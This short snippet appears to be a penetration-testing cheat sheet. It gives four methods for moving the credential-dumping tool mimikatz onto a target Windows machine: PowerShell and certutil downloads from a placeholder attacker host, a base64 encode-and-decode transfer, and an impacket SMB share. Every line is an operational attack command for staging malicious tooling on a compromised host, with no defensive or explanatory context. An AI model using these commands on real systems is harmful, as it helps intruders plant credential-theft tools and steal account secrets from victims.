# Method 1: Download with PowerShell
powershell -c "Invoke-WebRequest -Uri http://YOUR_IP/mimikatz.exe -OutFile mimikatz.exe"

# Method 2: Download with certutil
certutil -urlcache -f http://YOUR_IP/mimikatz.exe mimikatz.exe

# Method 3: Base64 transfer (smaller file)
# On attacker:
base64 -w0 mimikatz.exe > mimikatz.b64
# Copy the b64 string, on target:
echo "BASE64_STRING" > mimikatz.b64
certutil -decode mimikatz.b64 mimikatz.exe

# Method 4: SMB share
impacket-smbserver share $(pwd)
# On target:
copy \\YOUR_IP\share\mimikatz.exe mimikatz.exe